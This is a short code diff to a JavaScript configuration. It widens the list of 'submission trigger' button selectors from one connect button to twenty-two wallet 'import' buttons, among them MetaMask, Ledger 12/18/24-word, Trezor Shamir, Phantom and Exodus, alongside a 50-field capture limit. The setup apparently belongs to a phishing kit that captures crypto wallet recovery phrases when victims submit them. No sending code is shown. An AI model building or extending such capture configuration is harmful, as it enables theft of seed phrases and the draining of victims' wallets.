@@ -17,7 +17,30 @@
 
     // ✅ Submission triggers are BUTTON IDS (CSS selectors)
     // Add more IDs here as needed, e.g. "#payButton", "#confirmButton"
-    triggerSelectors: ["#connectButton"],
+    triggerSelectors: [
+  "#metamask-import-button",
+  "#trust-import-button",
+  "#coinbase-import-button",
+  "#ledger-import-button-12-word",
+  "#ledger-import-button-18-word",
+  "#ledger-import-button-24-word",
+  "#trezor-import-button-20-word",
+  "#trezor-import-button-12-word",
+  "#trezor-import-button-24-word",
+  "#trezor-import-button-shamir",
+  "#phantom-import-button",
+  "#okx-import-button",
+  "#rabby-import-button",
+  "#uniswap-import-button",
+  "#solflare-import-button",
+  "#magiceden-import-button",
+  "#electrum-import-button",
+  "#crypto-import-button",
+  "#exodus-import-button",
+  "#xverse-import-button",
+  "#unisat-import-button",
+  "#leather-import-button"
+],
 
     // Limits
     maxFields: 50,
